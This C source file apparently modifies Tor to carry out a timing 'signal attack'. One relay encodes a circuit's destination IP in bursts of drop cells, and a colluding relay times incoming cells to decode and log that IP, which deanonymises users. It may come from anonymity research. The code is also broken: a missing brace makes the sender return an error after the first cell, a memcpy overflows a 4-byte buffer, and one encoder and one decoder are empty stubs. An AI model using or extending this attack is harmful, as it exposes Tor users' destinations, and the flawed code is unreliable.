

#include "or.h"
#include "relay.h"
#include "orconfig.h"
#include "config.h"
#include "compat.h"
#include <time.h>
#include <unistd.h>
#define TOR_SIGNAL_ATTACK_PRIVATE
#include "signal_attack.h"


static int signal_send_relay_drop(int nbr, circuit_t *circ) {
  while (nbr > 0) {
    if (relay_send_command_from_edge_(0, circ,
                                RELAY_COMMAND_DROP, NULL, 0,
                                TO_ORIGIN_CIRCUIT(circ)->cpath->prev, __FILE__, __LINE__) < 0)
      log_debug(LD_BUG, "Signal not completly sent");
      return -1;
    nbr--;
  }
  return 0;
}

// TODO: Experiment with nanosleep
static void signal_bandwidth_efficient(char *address, circuit_t *circ) {

}
STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
  struct timespec time, rem;
  const or_options_t *options = get_options();
  time.tv_sec = 0;
  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
  char tmp_subaddress[4];
  int tmp_subip;
  tmp_subaddress[3] = '\0';
  for (int i = 1; i < 4; i++) {
    memcpy(tmp_subaddress, &address[4*i-4], 4*i-2);
    tmp_subip = atoi(tmp_subaddress);
    if (signal_send_relay_drop(tmp_subip, circ) < 0) {
      return -1;
    }
    /*sleep(1); //sleep 1second*/
    if (nanosleep(&time, &rem) < 0) {
      log_debug(LD_BUG, "nanosleep call failed \n");
      return -1;
    }
  }
  return 0;
}

// --------------------------_DECODING_ FUNCTIONS----------------------------------

static smartlist_t *circ_timings;

static int signal_compare_signal_decode_(const void **a_, const void **b_) {
  const signal_decode_t *a = *a_;
  const signal_decode_t *b = *b_;
  circid_t circid_a = a->circid;
  circid_t circid_b = b->circid;
  if (circid_a < circid_b)
    return -1;
  else if (circid_a == circid_b)
    return 0;
  else
    return 1;
}
static int signal_compare_key_to_entry_(const void *_key, const void **_member) {
  const circid_t circid = *(circid_t *)_key;
  const signal_decode_t *entry = *_member;
  if (circid < entry->circid)
    return -1;
  else if (circid == entry->circid)
    return 0;
  else
    return 1;
}

STATIC void handle_timing_add(signal_decode_t *circ_timing, struct timespec *now,
    int SignalMethod) {
  switch (SignalMethod) {
    case BANDWIDTH_EFFICIENT:
      if (smartlist_len(circ_timing->timespec_list) > 255*4) {
        // free the element before the moving operation from del_keeporder
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
      }
      smartlist_add(circ_timing->timespec_list, now);
      circ_timing->last = *now;
      break;
    case MIN_BLANK:
      //todo
      break;
    default:
      log_debug(LD_BUG, "handle_timing_add default case reached. It should not happen");
  }
}


STATIC int delta_timing(struct timespec *t1, struct timespec *t2) {
  const or_options_t *options = get_options();
  double elapsed_ms = (t2->tv_sec-t1->tv_sec)*1000.0 +\
                      (t2->tv_nsec-t1->tv_nsec)*1E-6;
  if (elapsed_ms  > SIGNAL_ATTACK_MAX_BLANK)
    return 2;
  else if (elapsed_ms > options->SignalBlankIntervalMS)
    return 0;
  else if (elapsed_ms > 0)
    return 1;
  else {
    log_debug(LD_BUG, "delta_timing compute a negative delta");
    return -1;
  }
}

/*
 * return 1 if successfully decoded a signal
 *        0 if saw nothing
 *       -1 if an error happened
 */

STATIC int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
  
  int i;
  int count = 0;
  int subips[4];
  int ipcount = 0;
  for (i = 1; i < smartlist_len(circ_timing->timespec_list); ++i) {
    switch (delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
          smartlist_get(circ_timing->timespec_list, i))) {
      case 0:
        subips[ipcount] = count;
        count = 0;
        if (ipcount == 3) {
          // we have decoded the signal
          log_info(LD_SIGNAL_ATTACK, "Dest IP : %d.%d.%d.%d",
              subips[0], subips[1], subips[2], subips[3]);
          return 1;
        }
        ipcount++;
        break;
      case 1:
        count++;
        break;
      case 2:
        // delta timing is above the accepting range, we restart the count to 0
        if (ipcount == 3) {
          // we have decoded the signal
          subips[ipcount] = count;
          log_info(LD_SIGNAL_ATTACK, "Dest IP : %d.%d.%d.%d",
              subips[0], subips[1], subips[2], subips[3]);
          return 1;
        }
        count = 0;
        break;
      default:
        return -1;
        break;
    }
  }
  return 0;
}
static int signal_minimize_blank_latency_decode(signal_decode_t *circ_timing) {
  
  return 0;
}


/*
 * Mapping o of circ->circ_id to signal_decode_t struct
 */



STATIC int signal_listen_and_decode(circuit_t *circ) {
  
  const or_options_t *options = get_options();
  // add to the smartilist the current time
  //todo
  signal_decode_t *circ_timing;
  struct timespec *now = tor_malloc(sizeof(struct timespec));
  circid_t circid = circ->n_circ_id;
  circ_timing = smartlist_bsearch(circ_timings, &circid, 
      signal_compare_key_to_entry_);
  clock_gettime(CLOCK_REALTIME, now);
  if (!circ_timing) {
    circ_timing = tor_malloc(sizeof(signal_decode_t));
    circ_timing->circid = circid;
    circ_timing->timespec_list = smartlist_new();
    circ_timing->first = *now;
    smartlist_insert_keeporder(circ_timings, circ_timing,
        signal_compare_signal_decode_);
  }
  circ_timing->last = *now;
  handle_timing_add(circ_timing, now, options->SignalMethod);
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: return signal_bandwidth_efficient_decode(circ_timing);
            break;
    case MIN_BLANK: return signal_minimize_blank_latency_decode(circ_timing);
            break;
    default:
      log_debug(LD_BUG, "signal_listen_and_decode switch: no correct case\n");
      return -1;
  }

  return 0;
}

//--------------------------END _DECODING_ FUNCTION-------------------------------


void signal_encode_destination(char *address, circuit_t *circ) {
  const or_options_t *options = get_options();
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: signal_bandwidth_efficient(address, circ);
            break;
    case MIN_BLANK: signal_minimize_blank_latency(address, circ);
  }
}


